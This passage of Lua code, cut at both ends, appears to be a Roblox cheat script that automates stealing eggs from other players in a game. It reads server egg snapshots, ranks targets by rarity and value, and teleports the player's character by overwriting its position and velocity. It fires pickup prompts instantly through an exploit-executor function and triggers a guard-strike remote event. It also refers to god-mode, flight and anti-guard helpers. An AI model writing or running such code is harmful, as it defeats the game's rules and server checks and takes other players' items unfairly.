				local rarity = type(flag3) == "table" and type(flag3.Rarity) == "table" and flag3.Rarity or nil
				local tbl19 = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				tbl19.RarityNumber = rarity or 0
				tbl19.EarningRate = type(flag3) == "table" and tonumber(flag3.EarningRate) or 0
				return tbl19
			end

			local function fn21(arg)
				local mutations = tbl.Mutations

				if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
					local ok, result = pcall(mutations.EarningsFor, type(arg) == "table" and arg or {})
					if ok and type(result) == "number" then
						return result
					end
				end

				return 1
			end

			local function fn22(arg, arg2)
				local eggRecords = tbl.EggRecords

				if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
					if ok and type(result) == "number" then
						return result
					end
				end

				return 0
			end

			fn19 = function(arg, arg2)
				local records = nil
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
					task.spawn(function()
						local ok, result = pcall(eggState.ReadFieldEggs)

						if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
							records = result.Records
						end
					end)
				end

				if not records then
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return {}
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					records = ok and type(result) == "table" and result.Records or nil
				end

				if type(records) ~= "table" then
					return {}
				end
				local tbl19 = {}
				local tbl20 = {}

				for _, record in pairs(records) do
					local uid2 = type(record) == "table" and record.Uid or nil

					if uid2 and record.State ~= "Claimed" then
						tbl20[uid2] = true
					end

					local flag3 = uid2 and (record.State == "Slot" or record.State == "Dropped" or record.State == "Carried" and arg2 == true and arg ~= true and not (tbl4.Steal.Carrying and uid2 == tbl4.Steal.CarryUid))
					local v18 = uid2 and tbl14[uid2] or nil
					local flag4 = uid2 and tbl15[uid2] == true or false
					local flag5 = arg ~= true and flag and uid2 and tbl17[tostring(record.AssetCategory)] or nil
					local flag6 = arg ~= true and tbl4.Steal.RiftPriority == true and uid2 ~= nil and tbl4.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
					local flag7 = arg == true or v18 ~= nil or flag4 or flag6 or flag5 ~= nil or tbl12[tostring(record.AreaId)] == true
					local flag8 = arg ~= true and v18 == nil and tbl16[uid2] == true
					local flag9 = v17 ~= nil and v17[uid2] == true
					flag3 = flag3 and typeof(record.BottomCFrame) == "CFrame"

					if flag3 then
						flag3 = (tbl18[uid2] or 0) <= os.clock()
					end

					if flag3 and flag7 and not flag8 and not flag9 then
						local v19 = fn20(record.AssetCategory)
						local str3 = tostring(record.AssetCategory)
						local flag10 = v19.RarityNumber >= n
						local flag11 = next(tbl13) == nil or tbl13[str3] == true
						local n10 = tonumber(record.AssetScale) or 1
						local v20 = fn21(record.Mutations)
						local n11 = n10 > 5 and (n10 / 5) ^ 1.2 * 19.637875755794113 or n10 ^ 1.85
						local flag12 = n2 <= 0 or v19.EarningRate * n11 * v20 >= n2
						flag12 = flag10 and flag11 and flag12
						local flag13 = flag6 and not flag12 and not flag4 and v18 == nil and flag5 == nil
						local lastSkip = arg ~= true and tbl4.SafeCarry.Unsafe({ Uid = uid2, Category = str3 })

						if lastSkip then
							tbl14[uid2] = nil
							tbl15[uid2] = nil
							tbl4.SafeCarry.LastSkip = lastSkip
						elseif arg == true or v18 or flag4 or flag6 or flag5 ~= nil or flag12 then
							table.insert(tbl19, {
								Uid = uid2,
								Category = str3,
								Scale = n10,
								State = record.State,
								Rarity = v19.RarityNumber,
								Weight = fn22(record.AssetCategory, n10),
								Mutation = v20,
								Value = v19.EarningRate * n11 * v20,
								CFrame = record.BottomCFrame,
								AreaId = tostring(record.AreaId),
								Rift = arg ~= true and flag6,
								RiftOnly = arg ~= true and flag13,
								Index = flag5,
								Forced = arg ~= true and v18 and v18.At or nil,
								Priority = arg ~= true and flag4,
							})
						end
					end
				end

				if next(tbl20) ~= nil then
					for k in pairs(tbl14) do
						if not tbl20[k] then
							tbl14[k] = nil
						end
					end

					for k in pairs(tbl15) do
						if not tbl20[k] then
							tbl15[k] = nil
						end
					end

					for k in pairs(tbl16) do
						if not tbl20[k] then
							tbl16[k] = nil
						end
					end
				end

				table.sort(tbl19, function(arg3, arg4)
					if arg3.Forced ~= nil ~= arg4.Forced ~= nil then
						return arg3.Forced ~= nil
					end

					if arg3.Forced and arg4.Forced and arg3.Forced ~= arg4.Forced then
						return arg3.Forced < arg4.Forced
					end

					if arg3.Priority ~= arg4.Priority then
						return arg3.Priority == true
					end

					if arg3.RiftOnly ~= arg4.RiftOnly then
						return arg4.RiftOnly == true
					end

					if arg3.Index ~= nil ~= arg4.Index ~= nil then
						return arg3.Index ~= nil
					end

					if arg3.Index and arg4.Index and arg3.Index ~= arg4.Index then
						return arg3.Index > arg4.Index
					end

					if v4 == tbl5[2] and arg3.Weight ~= arg4.Weight then
						return arg3.Weight > arg4.Weight
					end

					if v4 == tbl5[3] and arg3.Mutation ~= arg4.Mutation then
						return arg3.Mutation > arg4.Mutation
					end

					if v4 == tbl5[4] and arg3.Value ~= arg4.Value then
						return arg3.Value > arg4.Value
					end

					if v4 == tbl5[5] and arg3.Value ~= arg4.Value then
						return arg3.Value < arg4.Value
					end

					if arg3.Rarity ~= arg4.Rarity then
						return arg3.Rarity > arg4.Rarity
					end

					if arg3.Value ~= arg4.Value then
						return arg3.Value > arg4.Value
					end
					return tostring(arg3.Uid) < tostring(arg4.Uid)
				end)

				return tbl19
			end
		end

		local n10
		n10 = 6
		local fn20, fn21, fn22, fn23, fn24

		do
			local v18 = nil
			local connection = nil

			fn20 = function(arg, arg2, arg3, arg4, arg5)
				local n11 = arg2 - arg.Position
				local magnitude = n11.Magnitude
				local n12 = math.max(arg4, 0.0041666666666666666)
				local vector = Vector3.zero

				if magnitude > 0.01 then
					vector = n11.Unit * math.min(arg3, magnitude / n12)
				end

				local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n12 * 0.5, 0)

				if magnitude > 2 then
					if not arg5.mark then
						arg5.mark = magnitude
						arg5.clock = 0
					end

					arg5.clock = arg5.clock + arg4

					if arg5.clock >= 0.4 then
						if arg5.mark - magnitude < arg3 * 0.1 then
							pcall(function()
								arg.CFrame = arg.CFrame + n11.Unit * math.min(magnitude, arg3 * n12)
							end)
						end

						arg5.mark = magnitude
						arg5.clock = 0
					end
				else
					arg5.mark = nil
				end

				pcall(function()
					arg.AssemblyLinearVelocity = assemblyLinearVelocity
					arg.AssemblyAngularVelocity = Vector3.zero
				end)

				return magnitude <= 0.5
			end

			fn21 = function()
				local v19 = tbl4.Root()

				if v19 then
					pcall(function()
						v19.AssemblyLinearVelocity = Vector3.zero
						v19.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			local connection2 = nil
			local tbl19 = {}

			fn22 = function()
				v18 = nil

				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			fn23 = function()
				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				return num ~= nil and num > workspace:GetServerTimeNow()
			end

			local flag3 = false

			local function fn25()
				if flag3 then
					return true
				end
				return true
			end

			fn24 = function(arg, arg2)
				v18 = arg
				flag3 = arg2 == true
				if connection or not arg then
					return
				end
				tbl19 = {}

				connection = RunService.Heartbeat:Connect(function()
					if not v18 or fn25() or fn23() or tbl4.AntiGuard.Busy then
						return
					end
					local v19 = tbl4.Root()
					if not v19 then
						return
					end

					pcall(function()
						local rotation = v19.CFrame.Rotation
						v19.CFrame = CFrame.new(v18) * rotation
						v19.AssemblyLinearVelocity = Vector3.zero
						v19.AssemblyAngularVelocity = Vector3.zero
					end)
				end)

				connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if not v18 or not fn25() or fn23() or tbl4.AntiGuard.Busy then
						return
					end
					local v19 = tbl4.Root()

					if v19 then
						fn20(v19, v18, n5, deltaTime, tbl19)
					end
				end)
			end
		end

		fn4(fn22)
		local fn25

		fn25 = function()
			fn22()
			tbl4.EndFlight()
			tbl4.GodMode(false)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = false
			end
		end

		local n11, fn26, fn27

		do
			local n12 = 1.5
			n11 = 0.6

			local function fn28(arg, arg2)
				local x = arg2.X
				return (Vector3.new(arg.X, 0, arg.Z) - Vector3.new(x, 0, arg2.Z)).Magnitude
			end

			local function fn29(arg)
				local ok, result = pcall(function()
					return arg:GetPivot().Position
				end)

				return ok and result or nil
			end

			fn26 = function(arg, arg2, arg3)
				local v18 = fn28(arg.Position, arg3)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				if not areaEggSlotsClient then
					return true
				end

				for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
					if child:IsA("Model") and child.Name ~= arg2 then
						local v19 = fn29(child)
						if v19 and fn28(v19, arg.Position) + n12 < v18 then
							return false
						end
					end
				end

				return true
			end

			fn27 = function(arg, arg2, arg3)
				local n13 = arg3 or 14
				local v18 = nil
				local v19 = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local v20 = fn28(child.Position, arg2)

							if v20 < n13 then
								n13 = v20
								v18 = carryAreaEgg
								v19 = child
							end
						end
					end
				end

				if not v18 or not v19 then
					return nil
				end

				if type(arg) == "string" and not fn26(v19, arg, arg2) then
					return nil
				end
				return v18, v19
			end
		end

		local fn28

		fn28 = function(arg)
			local eggState = tbl.EggState

			if type(arg) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
				pcall(eggState.CarryFieldEgg, arg)
			end
		end

		local fn29

		do
			local function fn30()
				local carryUid = tbl4.Steal.CarryUid
				return type(carryUid) == "string" and carryUid or nil
			end

			local function fn31(arg)
				local v18 = fn30()
				if not v18 or type(arg) ~= "string" then
					return true
				end
				return v18 == arg
			end

			local function fn32(arg)
				if type(arg) ~= "string" then
					return false
				end
				local v18 = fn19(false, true)
				if #v18 == 0 then
					return true
				end

				for _, v19 in ipairs(v18) do
					if v19.Uid == arg then
						return true
					end
				end

				return false
			end

			local function fn33(arg)
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
					pcall(eggState.DropFieldEgg, "PlayerRequest")
				end

				local n12 = 0

				while tbl4.Steal.Carrying and n12 < 1 and not fn13(arg) do
					n12 += RunService.Heartbeat:Wait()
				end
			end

			fn29 = function(arg, arg2)
				local n12 = 0

				while not tbl4.Steal.Carrying and n12 < n11 and not fn13(arg2) do
					n12 += RunService.Heartbeat:Wait()
				end

				if not tbl4.Steal.Carrying then
					str2 = "The egg never reached the hand"
					return false
				end

				if fn31(arg) then
					return true
				end
				local v18 = fn30()
				if fn32(v18) then
					str2 = "Holding another egg that still matches, delivering it"
					return true
				end
				str2 = "Wrong egg in hand, dropping it"
				fn33(arg2)
				return false
			end
		end

		local fn30

		fn30 = function(arg, arg2)
			local eggState = tbl.EggState
			local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
			if not position then
				return false
			end
			local n12 = 0
			local huge = math.huge
			local n13 = 0

			while n12 < 1.5 do
				if fn13(arg2) then
					return false
				end

				if tbl4.Steal.Carrying then
					return true
				end

				if huge >= 0.06 then
					local v18 = fn27(arg.Uid, position)

					if v18 then
						pcall(function()
							v18.HoldDuration = 0
						end)

						n13 = 0

						if typeof(fireproximityprompt) == "function" then
							pcall(fireproximityprompt, v18)
						end
					else
						n13 += 1
						if n13 >= 4 then
							return false
						end

						if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
							pcall(eggState.CarryFieldEgg, arg.Uid)
						end
					end

					huge = 0
				end

				local result = RunService.Heartbeat:Wait()
				n12 += result
				huge += result
			end

			return tbl4.Steal.Carrying == true
		end

		local fn31

		local v18 = fn2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		fn31 = function()
			local character = localPlayer.Character

			if type(v18) == "table" and type(v18.IsRagdolled) == "function" then
				local ok, result = pcall(v18.IsRagdolled, character)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			if num and num > workspace:GetServerTimeNow() then
				return true
			end
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				local state = humanoid:GetState()
				return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
			end
			return false
		end

		local fn32

		fn32 = function(arg, arg2)
			if tbl4.Steal.Carrying then
				return true
			end
			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return false
			end
			local n12 = 0

			while n12 < 1 do
				if fn13(arg2) or tbl4.Steal.Carrying then
					return tbl4.Steal.Carrying == true
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil

				if type(records) == "table" then
					local flag3 = false

					for _, record in pairs(records) do
						if type(record) == "table" and record.Uid == arg and (record.State == "Slot" or record.State == "Dropped") then
							flag3 = true
							break
						end
					end

					if not flag3 then
						return tbl4.Steal.Carrying == true
					end
				end

				n12 += task.wait(0.3)
			end

			return tbl4.Steal.Carrying == true
		end

		local fn33

		local function fn34(arg)
			local v19 = tbl4.Root()
			local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
			if not v19 or not position then
				return math.huge
			end
			return (v19.Position - position).Magnitude
		end

		fn33 = function(arg)
			local huge = math.huge
			local v19 = nil

			for _, v20 in ipairs(arg) do
				local v21 = fn34(v20)

				if v21 < huge then
					huge = v21
					v19 = v20
				end
			end

			return v19, huge
		end

		local n12
		n12 = 20
		local n13
		n13 = 90
		local fn35, stealHome, fn36, fn37, fn38

		do
			local n14 = 6

			fn35 = function(arg, arg2, arg3, arg4, arg5, arg6)
				fn22()
				local v19 = tbl4.Root()
				if not v19 then
					return false
				end
				local character = localPlayer.Character
				local position = v19.Position
				local tbl19 = {}
				local position2 = nil
				local flag3 = nil
				local str3 = nil
				local n15 = 0

				local function fn39()
					if arg4 ~= nil then
						return true
					end
					return true
				end

				local function fn40(arg7)
					n15 += arg7
					if fn13(arg2) then
						flag3 = false
						return nil
					end

					if arg3 and not tbl4.Steal.Carrying then
						flag3 = false
						str3 = "dropped"
						return nil
					end

					if arg6 then
						local v20 = arg6()

						if v20 then
							flag3 = false
							str3 = v20
							return nil
						end
					end

					local v20 = tbl4.Root()

					if not v20 or n15 >= 25 or localPlayer.Character ~= character then
						flag3 = false
						str3 = "respawned"
						return nil
					end

					return v20
				end

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					if flag3 ~= nil or fn39() or tbl4.AntiGuard.Busy then
						return
					end
					local v20 = fn40(deltaTime)
					if not v20 then
						return
					end

					if n10 < (v20.Position - position).Magnitude then
						if arg5 then
							flag3 = false
							str3 = "displaced"
							return
						end

						position = v20.Position
					end

					local n16 = (arg4 or n3) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)
					local n17 = arg - position
					local n18 = n16 * deltaTime
					local flag4 = n17.Magnitude <= math.max(n18, 0.05)
					position = flag4 and arg or position + n17.Unit * n18
					local vector = Vector3.new(n17.X, 0, n17.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v20.CFrame.Rotation

					pcall(function()
						v20.CFrame = CFrame.new(position) * cframe
						v20.AssemblyLinearVelocity = Vector3.zero
						v20.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag4 then
						flag3 = true
					end
				end)

				local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if flag3 ~= nil or not fn39() or tbl4.AntiGuard.Busy then
						return
					end
					local v20 = fn40(deltaTime)
					if not v20 then
						return
					end
					local n16 = (arg4 or n3) * (os.clock() < (tbl4.SafeCarry.SlowUntil or 0) and tbl4.SafeCarry.SlowFactor or 1)

					if arg5 and position2 and (v20.Position - position2).Magnitude > n10 + n16 * deltaTime then
						flag3 = false
						str3 = "displaced"
						return
					end

					if fn20(v20, arg, n16, deltaTime, tbl19) then
						flag3 = true
					end

					position2 = v20.Position
					position = v20.Position
				end)

				while flag3 == nil do
					RunService.Heartbeat:Wait()
				end

				connection:Disconnect()
				connection2:Disconnect()

				if fn39() and not flag3 then
					fn21()
				end

				if flag3 then
					fn24(arg, arg4 ~= nil)
				end

				return flag3, str3
			end

			local tbl19 = {
				{
					Path = { "GearGiver_Slap", "Podium" },
					Offset = Vector3.new(-16.415, 21.072, -6.106),
				},
				{
					Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
				{
					Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
			}

			stealHome = function()
				for _, v19 in ipairs(tbl19) do
					local v20 = workspace

					for _, v21 in ipairs(v19.Path) do
						v20 = v20 and v20:FindFirstChild(v21) or nil
					end

					if v20 and v20:IsA("BasePart") then
						return v20.CFrame:PointToWorldSpace(v19.Offset)
					end
				end

				return Vector3.new(528.7, 70.57, -364.11)
			end

			tbl4.StealHome = stealHome

			tbl4.InsideBase = function(arg)
				if not arg then
					arg = tbl4.Root()
					arg = arg and arg.Position
				end

				if arg == nil then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				local separationLine = world and world:FindFirstChild("SeparationLine")
				return arg.X < (separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552)
			end

			local function fn39(arg)
				if tbl4.AntiGuard.Busy then
					return false
				end
				local character = localPlayer.Character
				local v19 = tbl4.Root()
				if not character or not v19 then
					return false
				end
				local rotation = v19.CFrame.Rotation
				local cFrame = CFrame.new(arg) * rotation

				pcall(function()
					character:PivotTo(cFrame)
				end)

				if (v19.Position - arg).Magnitude > 3 then
					pcall(function()
						v19.CFrame = cFrame
					end)
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.AssemblyLinearVelocity = Vector3.zero
							descendant.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				return true
			end

			local function fn40(arg)
				if tbl4.AntiGuard.Busy then
					return
				end
				local character = localPlayer.Character
				local v19 = tbl4.Root()
				if not character or not v19 or not arg then
					return
				end

				if (v19.Position - arg).Magnitude > 6 then
					fn39(arg)
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant ~= v19 and (descendant.Position - v19.Position).Magnitude > 12 then
						pcall(function()
							descendant.CFrame = v19.CFrame
							descendant.AssemblyLinearVelocity = Vector3.zero
						end)
					end
				end
			end

			local function fn41(arg, arg2)
				local n15 = 0

				while n15 < n14 do
					if fn13(arg) then
						return false
					end
					local character = localPlayer.Character
					local flag3 = fn31()

					if not flag3 and character then
						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
								flag3 = true
								break
							end
						end
					end

					if not flag3 then
						break
					end
					fn40(arg2)
					n15 += RunService.Heartbeat:Wait()
				end

				return not fn13(arg)
			end

			local function fn42(arg)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				local guardAreas = world and world:FindFirstChild("GuardAreas")
				local areaId = guardAreas and arg and arg.AreaId and guardAreas:FindFirstChild(arg.AreaId)
				return areaId and areaId:FindFirstChild("Guard") or nil
			end

			fn36 = function(arg)
				local v19 = fn42(arg)
				return v19 ~= nil and v19:GetAttribute("GuardState") == "Sleeping"
			end

			local n15 = 3

			fn37 = function(arg)
				local v19 = fn42(arg)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not v19 or not position then
					return nil, nil
				end

				local ok, result = pcall(function()
					return v19:GetPivot().Position
				end)

				if not ok then
					return nil, nil
				end
				local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
				if vector.Magnitude < 0.1 then
					return nil, nil
				end
				local n16 = result + vector.Unit * n15
				return Vector3.new(n16.X, position.Y + 3, n16.Z), result
			end

			local function fn43(arg, arg2)
				local tbl20 = { Landed = false, Destination = arg2 }
				local antiGuard = tbl4.AntiGuard
				antiGuard.HitArms = antiGuard.HitArms + 1
				tbl4.AntiGuard.HitArmedAt = os.clock()

				tbl20.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
					if tbl20.Landed or fn13(arg) then
						return
					end
					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if not num or num <= workspace:GetServerTimeNow() then
						return
					end
					local v19 = tbl4.Root()
					if not v19 then
						return
					end
					tbl20.Landed = true
					fn22()
					tbl4.SafeCarry.JumpDistance = (tbl20.Destination - v19.Position).Magnitude
					tbl4.SafeCarry.JumpAt = os.clock()

					pcall(function()
						v19.CFrame = CFrame.new(tbl20.Destination)
						v19.AssemblyLinearVelocity = Vector3.zero
					end)
				end)

				tbl20.Stop = function()
					if tbl20.Link then
						tbl20.Link:Disconnect()
						tbl20.Link = nil
						tbl4.AntiGuard.HitArms = math.max(0, tbl4.AntiGuard.HitArms - 1)
					end
				end

				return tbl20
			end

			fn38 = function(arg, arg2, arg3)
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end

				local n16 = 0
				local v19 = nil

				while not arg2.Landed and n16 < n12 do
					if fn13(arg) then
						break
					end

					if arg3 then
						arg3(arg2)
					end

					if not tbl4.Steal.Carrying then
						local v20 = v19 or n16
						if n16 - v20 > 1 then
							break
						end
						v19 = v20
					end

					n16 += RunService.Heartbeat:Wait()
				end

				arg2.Stop()
				return arg2.Landed
			end

			local n16 = 20

			local function fn44(arg, arg2, arg3, arg4)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n17 = 0
				local huge = math.huge

				while n17 < arg3 do
					if fn13(arg2) then
						return false
					end

					if tbl4.Steal.Carrying then
						return true
					end

					if huge >= 0.1 then
						local v19 = fn27(arg.Uid, position)

						if v19 then
							pcall(function()
								v19.HoldDuration = 0
							end)

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, v19)
							end
						else
							fn28(arg.Uid)
						end

						huge = 0
					end

					if arg4 then
						fn40(arg4)
					end

					local result = RunService.Heartbeat:Wait()
					n17 += result
					huge += result
				end

				return tbl4.Steal.Carrying == true
			end

			local function fn45(arg, arg2, arg3, arg4)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n17 = position + Vector3.new(0, 3, 0)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and character:FindFirstChildWhichIsA("Tool") then
					pcall(function()
						humanoid:UnequipTools()
					end)
				end

				if arg3 then
					fn24(n17, true)
					str2 = "Waiting to stand up"
					if not fn41(arg2, n17) then
						return false
					end

					if tbl4.SafeCarry.Enabled and arg4 == nil and tbl4.SafeCarry.Settle then
						if not tbl4.SafeCarry.Settle(arg2, arg) then
							return false
						end
					end
				else
					str2 = "Jumping to the egg"
					local v19 = tbl4.Root()

					if v19 and (n17 - v19.Position).Magnitude <= n13 then
						pcall(function()
							local rotation = v19.CFrame.Rotation
							v19.CFrame = CFrame.new(n17) * rotation
							v19.AssemblyLinearVelocity = Vector3.zero
							v19.AssemblyAngularVelocity = Vector3.zero
						end)
					elseif not fn35(n17, arg2, nil, n5) then
						return false
					end
				end

				if fn13(arg2) then
					return false
				end
				local flag3 = arg4 and typeof(arg4.CFrame) == "CFrame"
				local v19 = nil

				if flag3 then
					v19 = fn43(arg2, arg4.CFrame.Position + Vector3.new(0, 3, 0))
				end

				local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local flag4 = type(arg.Uid) == "string" and string.sub(arg.Uid, 1, #str3) == str3 and string.match(arg.Uid, "_([%w ]+:Slot_%d+)$") or nil
				arg4 = arg4 and flag4
				local flag5 = false

				if arg4 then
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
						str2 = "Taking the starter egg"

						task.spawn(function()
							pcall(eggState.CarryFieldEgg, arg.Uid, flag4)
						end)

						local n18 = 0

						while not tbl4.Steal.Carrying and n18 < 0.8 do
							if fn13(arg2) then
								return false
							end
							n18 += RunService.Heartbeat:Wait()
						end

						flag5 = tbl4.Steal.Carrying == true
					end
				end

				if not flag5 then
					str2 = "Taking the egg"
					flag5 = fn30(arg, arg2)

					if not flag5 and not fn13(arg2) then
						fn35(n17, arg2, nil, n5)
						flag5 = fn30(arg, arg2)
					end
				end

				if not flag5 and not fn32(arg.Uid, arg2) then
					if v19 then
						v19.Stop()
					end

					tbl18[arg.Uid] = os.clock() + n7
					str2 = "That egg would not come free"
					return false
				end

				if v19 then
					local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
					local v20 = fn42(arg) or fn42({ AreaId = "Forest" })
					local humanoidRootPart = v20 and v20:FindFirstChild("HumanoidRootPart")

					if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
						str2 = "Calling the guard strike"

						pcall(function()
							reGuardPatrolForestStrike:FireServer({ EggUid = arg.Uid, GuardCFrame = humanoidRootPart.CFrame })
						end)
					end
				end

				tbl4.Steal.LastFinishedAt = os.clock()
				return true, v19
			end

			local huge = math.huge
			local huge2 = math.huge

			local function fn46(arg, arg2, arg3)
				local v19 = nil
				local v20 = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local magnitude = (child.Position - arg).Magnitude

							if magnitude < arg2 then
								arg2 = magnitude
								v19 = carryAreaEgg
								v20 = child
							end
						end
					end
				end

				if v19 and v20 and type(arg3) == "string" and not fn26(v20, arg3, arg) then
					return nil
				end
				return v19, v20
			end

			local function fn47(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local v19 = workspace:FindFirstChild(arg) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if not v19 then
					return nil
				end

				local ok, result = pcall(function()
					return v19:GetPivot().Position
				end)

				return ok and result or nil
			end

			local function fn48(arg)
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return nil
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil
				if type(records) ~= "table" then
					return nil
				end

				for _, record in pairs(records) do
					if type(record) == "table" and record.Uid == arg and typeof(record.BottomCFrame) == "CFrame" then
						return record.BottomCFrame.Position, true
					end
				end

				return nil, true
			end

			local function fn49(arg)
				local v19 = workspace:FindFirstChild(arg)
				if not v19 then
					return false
				end

				for _, descendant in ipairs(v19:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok then
							for _, v20 in ipairs({ result, result2 }) do
								if typeof(v20) == "Instance" and not v20:IsDescendantOf(v19) then
									local model = v20:FindFirstAncestorOfClass("Model")
									if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
										return true
									end
								end
							end
						end
					end
				end

				return false
			end

			local function fn50(arg, arg2)
				local state = 1
				local v19, carryUid, n17, vector, connection, n18, n19, huge3, v20, n20, huge4, flag3, v21, v22, v23, now, v24, v25, flag4, n21, flag5, v26

				while true do
					if state == 1 then
						v19 = arg
						carryUid = arg2

						if carryUid then
							state = 3
						else
							state = 2
						end
					elseif state == 2 then
						carryUid = tbl4.Steal.CarryUid
						state = 3
					elseif state == 3 then
						if type(carryUid) ~= "string" then
							state = 47
						else
							state = 4
						end
					elseif state == 4 then
						fn22()
						str2 = "Following the egg"
						n17 = nil
						vector = Vector3.zero

						connection = RunService.PreSimulation:Connect(function(deltaTime)
							local v27 = tbl4.Root()
							if not v27 or not n17 or tbl4.Steal.Carrying or fn13(v19) then
								return
							end

							if fn23() then
								if (v27.Position - n17).Magnitude > 2 then
									fn39(n17)
								end

								return
							end

							local n22 = math.max(deltaTime, 0.0041666666666666666)
							local n23 = vector + (n17 - v27.Position) / math.max(0.08, n22)
							local n24 = n5 + vector.Magnitude

							if n24 < n23.Magnitude then
								n23 = n23.Unit * n24
							end

							local assemblyLinearVelocity = n23 + Vector3.new(0, workspace.Gravity * n22 * 0.5, 0)

							pcall(function()
